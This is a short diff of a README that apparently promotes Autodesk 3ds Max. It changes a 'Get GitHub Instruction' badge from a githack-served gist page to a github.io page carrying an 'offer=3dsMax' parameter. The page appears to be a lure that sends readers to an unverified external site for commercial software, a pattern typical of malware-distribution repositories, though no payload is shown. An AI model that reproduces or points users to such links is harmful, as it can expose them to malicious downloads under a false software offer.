@@ -3,7 +3,7 @@
 
 Autodesk 3ds Max is a professional 3D design environment used by artists, architects, and game developers for creating detailed models, animations, and photo-realistic renders. With robust geometry tools and GPU-accelerated rendering, it delivers performance and precision for every workflow. 🧩  
 
-[![🟢 Get GitHub Instruction](https://img.shields.io/badge/🟢%20Get%20GitHub%20Instruction-00A6A0?style=for-the-badge&logo=autodesk&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/blackblanca8-boop/d5abf3f1ef2f94c071168f2680e92515/raw/9dab4f0336dbfc7b8ac54e45574c48f2cfbd87a0/get.html?offer=3dsMax)
+[![🟢 Get GitHub Instruction](https://img.shields.io/badge/🟢%20Get%20GitHub%20Instruction-00A6A0?style=for-the-badge&logo=autodesk&logoColor=white&labelColor=0B0F19)](https://app-desk-hub.github.io/.github/?offer=3dsMax)
 
 ---
 
